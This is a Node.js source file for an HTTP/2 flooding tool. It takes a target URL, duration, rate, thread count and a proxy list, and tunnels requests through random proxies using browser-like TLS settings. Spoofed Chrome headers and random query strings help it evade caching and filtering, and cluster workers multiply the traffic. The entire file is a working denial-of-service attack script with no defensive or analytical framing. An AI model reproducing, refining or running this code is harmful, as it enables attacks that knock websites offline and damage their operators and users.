const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
]
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 const secureProtocol = "TLS_method";

 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

 const secureContext = tls.createSecureContext(secureContextOptions);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`Usage: host time rate threads proxy.txt`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
const parsedPort = parsedTarget.protocol === "https:" ? 443 : 80;

const proxies = fs.readFileSync(args.proxyFile, "utf-8").trim().split(/\r?\n/);

const encoding_header = ["gzip, deflate, br"];
const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "no-cors", "cors"];
const fetch_dest = ["document", "worker"];

const language_header = [
    'en-US,en;q=0.9,ru;q=0.8',
    'ru-RU,ru;q=0.9,en-US;q=0.8',
    'kk-KZ,kk;q=0.9,ru;q=0.8'
];

const baseHeaders = {
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":method": "GET",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Chromium";v="122", "Google Chrome";v="122", "Not(A:Brand";v="24"',
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-mobile": "?0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
};

const h2Settings = {
    headerTableSize: 65536,
    initialWindowSize: 6291456,
    maxHeaderListSize: 32768,
    maxFrameSize: 16384,
    enablePush: false
};

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(15000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => connection.write(buffer));

        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            }
            connection.destroy();
            callback(undefined, "bad proxy");
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "timeout");
        });
    }
}

const Socker = new NetSocket();

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[randomInt(0, arr.length - 1)];
}

function generateRandomString(min, max) {
    const length = randomInt(min, max);
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    for (let i = 0; i < length; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return out;
}

function runFlooder() {
    const proxy = randomElement(proxies).split(":");

    const proxyOptions = {
        host: proxy[0],
        port: ~~proxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: cipper,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setMaxListeners(0);


        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: h2Settings
        });

        const settings = {
            enablePush: false,
            initialWindowSize: 15564991,
        };

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {

                    const dynamicPath = parsedTarget.path + "?q=" + generateRandomString(10, 25);

                    const headers = {
                        ...baseHeaders,
                        ":path": dynamicPath,
                        "accept-encoding": randomElement(encoding_header),
                        "sec-fetch-mode": randomElement(fetch_mode),
                        "sec-fetch-site": randomElement(fetch_site),
                        "sec-fetch-dest": randomElement(fetch_dest),
                        "accept-language": randomElement(language_header)
                    };

                    const req = client.request(headers, {
                        parent: 0,
                        exclusive: true,
                        weight: 220
                    });

                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });

                    req.end();
                }
            }, 300);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
} else {
    setInterval(runFlooder);
}

setTimeout(() => process.exit(0), args.time * 1000);

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});